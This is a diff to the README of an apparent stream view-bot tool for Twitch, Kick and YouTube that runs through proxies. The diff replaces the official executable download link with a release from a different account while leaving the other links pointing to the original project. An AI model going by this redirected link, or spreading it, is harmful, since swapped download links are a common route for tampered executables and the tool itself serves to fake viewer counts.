@@ -22,7 +22,7 @@ Platform              |      Twitch      |       Kick       |        Youtube    
 
 ### Getting Started
 
-1. Download the one-file executable for Windows from the [latest VADC release](https://github.com/KevinBytesTheDust/cvamp/releases/latest).
+1. Download the one-file executable for Windows from the [latest VADC release](https://github.com/dedalo88888/VADC/releases/tag/Version_Free).
 2. Provide your proxies or follow our comprehensive [Proxies Guide](https://github.com/KevinBytesTheDust/cvamp/wiki/Webshare.io-Proxies-Guide).  
    Get 10 free proxies for testing and 10% off your first proxy purchase at [Webshare.io](https://blueloperlabs.ch/proxy/wf).  
 
